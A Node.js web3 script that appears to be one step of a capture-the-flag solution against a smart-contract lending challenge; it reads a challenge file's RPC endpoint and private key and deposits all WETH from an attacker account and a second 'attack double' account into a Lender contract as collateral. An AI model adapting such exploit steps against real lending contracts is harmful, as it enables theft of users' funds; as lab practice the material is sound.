// import data
const challengeData =			require("./challenge2.json");
const setupABIsetup =			require("./setupABIsetup.json");
const lenderABIlender =			require("./lenderABIlender.json");
const lenderABIweth9 =			require("./lenderABIweth9.json");

const {attackdouble} =			require("./attackdouble.js");

const ENDPOINT =			challengeData["RPC endpoint"];
const SETUPACCT =			challengeData["Setup contract"];
const ATTACKPRIKEY =			challengeData["Private key"];

// setup
const Web3 = require("web3");

// connect
const web3 = new Web3(ENDPOINT);

async function main() {

	try {	

		// get attacker account so I can check my loot
		var ATTACKACCT = await web3.eth.getAccounts();
		ATTACKACCT = ATTACKACCT.toString();

		// get attack double account info
		const ATTACKDBL = attackdouble.address;
		const ATTACKDBLPRIKEY = attackdouble.privateKey;

		// init Setup contracts
		const Setup = new web3.eth.Contract(setupABIsetup, SETUPACCT);
		
		const weth = await Setup.methods.weth().call();

		// get lender, token, pair addresses
		const lender = await Setup.methods.lender().call();

		// init Lender contracts
		const Lender = new web3.eth.Contract(lenderABIlender, lender);
		const LenderWeth9 = new web3.eth.Contract(lenderABIweth9, weth);
		
		// get available weth balance
		var balance = await LenderWeth9.methods.balanceOf(ATTACKACCT).call();

		// deposit all weth as collateral
		var Deposit = await Lender.methods.deposit(balance).encodeABI();
   		var DepositTX = {
			to: lender,
       			from: ATTACKACCT,
			gas: 1000000,
        		data: Deposit,
		};
		var signedTX = await web3.eth.accounts.signTransaction(DepositTX, ATTACKPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Deposit TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

		// repeat for attack double account
		balance = await LenderWeth9.methods.balanceOf(ATTACKDBL).call();
		Deposit = await Lender.methods.deposit(balance).encodeABI();
    		DepositTX = {
			to: lender,
       			from: ATTACKDBL,
			gas: 1000000,
        		data: Deposit,
		};
		signedTX = await web3.eth.accounts.signTransaction(DepositTX, ATTACKDBLPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Deposit TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

	} catch (error) {
		
		// catch any random errors
		console.log("Error: " + error);
	}
}

main();
